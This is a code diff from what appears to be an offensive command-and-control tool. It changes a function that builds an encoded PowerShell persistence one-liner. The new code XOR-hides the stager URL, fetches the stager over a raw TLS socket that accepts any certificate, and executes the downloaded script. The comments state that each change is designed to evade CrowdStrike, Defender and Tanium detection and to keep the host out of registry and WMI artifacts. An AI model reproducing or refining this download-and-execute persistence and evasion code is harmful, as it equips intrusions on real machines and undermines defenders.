@@ -495,23 +495,23 @@ def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | Non
         print(f"[!] C2 agent stager not found — run: lilith build --c2-stager first")
         return None
 
-    # Task 7 — Shrink persistence payload.
-    # The old approach embedded the full stager bootstrap (AMSI bypass + WinHTTP download)
-    # as a -enc argument, producing 2-5KB of base64 visible in the registry/WMI value.
-    # A large -enc blob is a well-known heuristic (CrowdStrike, Defender, Tanium).
-    #
-    # New approach: a tiny PS1 one-liner that fetches and executes the stager via a single
-    # WinHttp call. The stager URL is XOR-encoded in the one-liner so no plain IP/path
-    # appears in the persistence artifact. The resulting -enc is <300 bytes.
+    # Compact persistence one-liner: XOR-decode URL, fetch via TcpClient+SslStream, execute.
+    # Uses IO.StreamReader.ReadToEnd() to avoid the MemoryStream read loop — keeps the
+    # base64 blob small (~1.5KB) while avoiding WinHTTP COM (flagged by Defender/CrowdStrike).
+    # The stager URL is XOR-encoded so no plain IP/path appears in registry/WMI values.
     url_key = _sec.randbits(7) + 15  # 15-142 key range, avoids 0
     url_enc  = ",".join(str(ord(c) ^ url_key) for c in stager_url)
-    # Compact one-liner: decode URL, fetch, execute
     compact_ps1 = (
         f"$k={url_key};"
         f"$u=([byte[]]@({url_enc})|%{{[char]($_ -bxor $k)}})-join'';"
-        f"$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;"
-        f"$h.Open('GET',$u,$false);$h.Option(4)=13056;$h.Send();"
-        f"[scriptblock]::Create($h.ResponseText).Invoke()"
+        f"$h=[Uri]$u;"
+        f"$t=New-Object Net.Sockets.TcpClient($h.Host,$h.Port);"
+        f"$s=New-Object Net.Security.SslStream($t.GetStream(),$false,{{$true}});"
+        f"$s.AuthenticateAsClient($h.Host);"
+        f'$q=[Text.Encoding]::ASCII.GetBytes("GET "+$h.PathAndQuery+" HTTP/1.1`r`nHost: "+$h.Host+"`r`nConnection: close`r`n`r`n");'
+        f"$s.Write($q,0,$q.Length);"
+        f"$r=(New-Object IO.StreamReader($s,[Text.Encoding]::UTF8)).ReadToEnd();"
+        r"[scriptblock]::Create(($r -split '\r\n\r\n',2)[1]).Invoke()"
     )
     enc_b64 = _b64.b64encode(compact_ps1.encode("utf-16-le")).decode()
 
